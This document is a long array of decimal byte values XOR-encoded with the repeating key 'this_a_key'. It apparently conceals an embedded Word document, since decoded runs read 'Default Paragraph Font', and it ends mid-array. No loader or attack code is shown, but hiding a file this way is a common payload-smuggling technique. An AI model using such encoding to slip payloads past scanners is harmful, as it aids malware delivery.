105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  93,  20,  94, 105, 101, 122,   116, 104,  34, 112,  95,  97, 161, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  94, 107, 101, 120,   122, 104, 102, 115,  87,  97,  94, 107,  46, 121,   123, 104, 105, 115,  95,  97,  99, 107, 101,  57,   133, 151, 107, 115,  99,  97,  89,  37,  10,  11,    25,   9,   5, 115, 126,  97,  95, 107, 106, 100,   116,  97, 137, 114, 159,  98, 255, 110, 229, 126,    20,  97,  41, 120, 127, 108,  95, 100, 133, 105,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   114, 104,  52, 112,  95,   0,  86, 111, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97, 125, 107,  36,  57,   134, 151, 200, 115, 125,  97,  73,  47,   0,  31,    21,  29,   5,   7, 127,  49,  62,  25,   4,  30,     6,   9,  25,  27, 127,  39,  48,   5,  17, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  20,  97,  95, 107, 102, 121,   139, 151, 150, 140,  92,  97, 160, 148, 154, 134,   117, 104, 109,  83, 160, 158,  94, 107, 101, 121,   116, 104,  34, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  20, 107, 101, 121,   116, 107, 169,  82,  56,  99,  95, 104, 101, 121,   242, 107, 105, 115,  93,  97,  95, 104, 101, 121,    63, 107, 105, 115,  92,  97,  24, 107, 102,   0,    29,   6,  98,  48, 101,  61,  57,  90,  81,  30,    90,  12,   6,   7,  92,  24,  54,   5,  85,  58,    78,  52,  62,  58,  17,  47,  11,  55,  53,  11,    27,  14,   0,  31,  58,  18,   3,  42,   1,  20,    29,   6,   0,   0,  43,  19,  62,  31,  10,  11,    40,  44,  12,   0,  52,  21,  48,  27,  57,  31,    69,  92,  14,  93,  59,  14,  43, 148, 100, 120,   116,  61,  68, 115,  95,  97,  95, 148, 154,  50,   119, 104, 105,  72,  95,  97,  95, 104, 101, 121,   116,  35, 106, 115,  95, 113,  86, 107,  97,  31,    69,  92,  14, 114,  95, 112,  94, 107, 101, 121,   112,  46,  88,  71,  24,  97,  31, 106, 229, 120,   116,  87, 105, 115,  95,  94,  95, 107, 101, 113,   116,  92, 104,  71,  94,  94,  95, 107, 101, 121,   116, 104, 105,  76,  95,  97,  95, 106,  96, 121,    33, 233,  10,  75,  95,  99,  67, 107, 101, 121,   116, 104, 105, 115,  21,  97,  95, 107,  46, 121,   116, 104,  89, 115,  95,  98,  95, 107, 100, 121,    68, 104,  35, 112,  95,  97,  95, 107,  38, 121,    97, 126, 249, 114,  95,  97,  11,   2,   8,  28,     7,  72,  39,  22,  40,  65,  13,   4,   8,  24,    26, 104, 101, 101, 207,  96,  93, 107,  54,   0,    25,  10,   6,  31,  95, 106, 121, 251, 100, 121,   116,  41,  27,  26,  62,  13,  95, 122,  80, 233,   117, 104, 105,  48,  48,  20,  45,   2,   0,  11,    84,  38,  12,   4,  95,  67,  95, 111, 101,  72,   124, 224, 113, 115,  95, 177,  93, 107, 101,  17,   117, 104, 105, 115,  95, 197, 211, 252, 162, 209,   248, 255, 174, 115,  95,  97,  95, 110, 101, 122,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 111, 101, 250,   100, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95,  79, 102, 121,   116, 104, 105, 108,  95,  97,  95,  99,  54,  12,    22,  72,  36,  50,  22,  47,  95, 107, 101, 121,   119,  17,   0,  29,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  13,  97,  48, 107,  10, 121,     0, 104,  73, 115,  26,  97,  49, 107,  17, 121,     6, 104,  16, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 115, 121,   113, 104, 150, 140, 160, 158, 160, 148, 154, 134,   119, 104, 105, 115,  95, 104,  93, 107, 101, 121,   116, 104, 169, 115,  95,  97,  95, 107, 101,  63,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104,   9,  86, 231, 168, 176,  17, 178, 120,   100, 104, 105, 115, 223, 109,  95, 107, 101, 121,   116, 104, 104, 115,  28,  97,  48, 107,   8, 121,     4, 104,  38, 115,  61,  97,  53, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  77, 107, 103, 120,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104,   7, 115,  95,  97,  95, 107, 101, 121,    35, 104,   6, 115,  45,  97,  59, 107,  33, 121,    27, 104,  10, 115,  42,  97,  50, 107,   0, 121,    26, 104,  29, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  69,  97,  93, 106, 154, 134,   139, 151, 109, 115,  95,  97, 160, 148, 154, 134,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  93, 107, 101, 121,    38,  98, 105, 115,  95,  97,  95, 107,  42, 121,    22, 104,   3, 115,  58,  97,  60, 107,  17, 121,    36, 104,   6, 115,  48,  97,  51, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 127, 115,  94,  96,  94, 107, 101, 121,   118, 104, 105, 115, 160, 158, 160, 148, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107,  69, 185,   190, 196, 134,   9, 136,  96, 127, 171, 175, 213,   155,  18, 190, 114,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   121, 104, 105, 115, 162, 158, 160, 148, 155, 134,   139, 151, 151, 140, 160, 158,  77, 107, 101, 121,   101, 104, 105, 115,  80,  97,  95, 107, 118, 121,   116, 104, 125, 115,  95,  97,  74, 107, 101, 121,   138, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148,  96, 121,    39, 104,  28, 115,  50,  97,  50, 107,   4, 121,     6, 104,  16, 115,  22,  97,  49, 107,   3, 121,    27, 104,  27, 115,  50,  97,  62, 107,  17, 121,    29, 104,   6, 115,  49,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104,  65, 115,  93,  97, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  79,  97,  95, 107,  35, 120,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   117, 104, 105, 115, 161, 158, 160, 148, 102, 121,   116, 104, 109, 115,  95,  97,  90, 107, 101, 121,   114, 104, 105, 115,  88,  97,  95, 107, 109, 121,   116, 104,  96, 115,  95,  97,  85, 107, 101, 121,   127, 104, 105, 115,  83,  97,  95, 107, 104, 121,   116, 104, 103, 115,  95,  97,  80, 107, 101, 121,    98, 104, 105, 115,  78,  97,  95, 107, 119, 121,   116, 104, 122, 115,  95,  97,  75, 107, 101, 121,    97, 104, 105, 115, 161, 158, 160, 148, 114, 121,   116, 104, 113, 115,  95,  97,  70, 107, 101, 121,   110, 104, 105, 115,  68,  97,  95, 107, 121, 121,   116, 104, 116, 115,  95,  97,  65, 107, 101, 121,   107, 104, 105, 115, 127,  97,  95, 107,  68, 121,   116, 104,  75, 115,  95,  97, 124, 107, 101, 121,    80, 104, 105, 115, 122,  97,  95, 107,  67, 121,   116, 104,  78, 115,  95,  97, 119, 107, 101, 121,    93, 104, 105, 115, 117,  97,  95, 107,  78, 121,   116, 104,  69, 115,  95,  97, 114, 107, 101, 121,    90, 104, 105, 115, 112,  97,  95, 107,  85, 121,   116, 104,  88, 115,  95,  97, 161, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 151, 140,  95,  97,  91, 107, 103, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  94, 107, 101, 121,   148, 237, 246, 129, 166,  46,  55, 123, 206, 232,   124, 104,  66,  84, 236, 184, 111, 107, 101, 121,    98, 105, 105, 115,  85,  97,  95, 107,  98, 121,   116, 104, 241, 115,  95,  97,  93, 107, 101, 121,   218, 104, 105, 115,  87,  97,  95, 107, 218, 121,   116, 104, 104, 115,  95,  97, 148, 107, 101, 121,   123, 104, 105, 115, 142,  97,  95, 107, 117, 121,   116, 104, 176, 115,  95,  97,  77, 107, 101, 121,   149, 104, 105, 115,  81,  97,  95, 107, 153, 121,   116, 104,  96, 115,  95,  97,  91, 106, 101, 121,   103, 104, 105, 115,  81,  96,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 119, 115,  95,  97,  81, 107, 101, 121,    55,  82,  53,  61,  48,  19,  50,  10,   9,  87,    16,   7,  29, 115,  65,  97,  95, 107, 108, 121,   116, 104,  58,   6,  61,  65,  18,  42,  44,  55,   116, 118, 105, 115,  95, 101,  95, 107, 101,   0,    29,   6, 105, 113,  95,  97,  95, 143,  97, 122,   116, 104, 105, 115,  95,  97,  95, 104, 101, 121,   116, 104, 105, 115,  95, 127,  95, 107, 101, 106,   116, 104, 105,  62,  54,   2,  45,   4,  22,  22,    18,  28,  73,  36,  48,  19,  59,  75,  83,  87,    68, 104, 106, 115,  95,  97,  95, 107, 101, 121,   106, 104, 105, 115,  93,  97,  95, 107,  83, 121,   119, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  75,  59,  78,  48,    67,  94,  69,  94,  22,  87,  27,  66,   5,  21,    16,  11,  32,  57,  89, 204, 119,  44,  99,  50,    53,  36,  35,  37,  74,  46,  23,  34,  46,  48,    59,  39, 105,  60,  19, 120,  64, 107, 124, 103,    61, 116, 105, 102,  71, 116,  17, 107,  43, 102,    56, 112, 105, 107,  66, 125,  64,  34, 123, 100,    96,  56,  66,  58, 104,  87,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  94,  97, 161, 148, 102, 115,   116, 104, 150, 140, 160, 158,  95,  98, 103, 121,   116, 104, 105, 115, 159,  97,  95, 107, 101, 121,   116,  46, 117, 115,  95,  97,  18,   2,   6,  11,    27,  27,   6,  21,  43,  65,   8,   4,  23,  29,    84,  94,  71,  67, 127,  37,  48,   8,  16,  20,    17,   6,  29, 115,  85,  97,  95, 107,  40,  42,    35,   7,  27,  23,  27,  14,  60, 107, 117, 121,   116, 104,  62,  28,  45,   5, 113,  47,  10,  26,     1,   5,  12,  29,  43,  79, 105, 107, 145,  64,   198,  25, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 181, 214,  55,  97,  26, 171, 108, 125,   116, 104,  92, 115,  58,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 104, 101, 121,    63, 107, 105, 115,  13, 107,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  20,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116,  96, 105, 115, 211,  97,  95, 107, 101, 113,   116, 104, 229, 115,  95,  97, 211,  99, 101, 121,   116, 104, 105, 115, 211, 105,  95, 107, 101, 121,   116, 104, 229, 123,  95,  97,  95, 107, 101, 121,   248,  96, 105, 115,  95,  97,  95, 107, 233, 113,   116, 104, 125, 115,  95,  97, 155,  99, 101, 121,   116, 104, 105, 115, 233, 105,  95, 107, 107, 121,   116, 104, 173, 123,  95,  97,  95, 107, 101, 121,   176,  96, 105, 115,  95,  97,  95, 107, 161, 113,   116, 104, 105, 115,  95,  97, 155,  99, 101, 121,   126, 104, 105, 115, 145, 105,  95, 107, 111, 121,   116, 104, 173, 123,  95,  97,  95, 107, 101, 121,   236,  97, 105, 115,  28,  97,  95, 107, 189, 113,   116, 104, 105, 115,  95,  97, 135,  99, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,   172,  96, 105, 115,  95,  97,  95, 107, 189, 113,   116, 104, 105, 115,  95,  97, 135,  99, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,    37,  97, 105, 115,  95,  97,  95, 107,  52, 112,   116, 104, 105, 115,  95,  97,  14,  98, 101, 121,   116, 104, 105, 115,  14, 104,  95, 107, 101, 121,   116, 104,  56, 122,  95,  97,  95, 107, 101, 121,    37,  97, 105, 115,  65,  97,  95, 107, 190, 112,   116, 104,  49, 115,  95,  97, 108,  97, 101, 121,   107, 104, 105, 115,  48, 104,  95, 107,  76, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 233, 113,   116, 104, 105, 115,  95,  97, 135,  99, 101, 121,   116, 104, 105, 115,  95,  97,  93, 107, 102, 121,   117, 104, 104, 115, 135, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97, 135,  99, 101, 121,   116, 104, 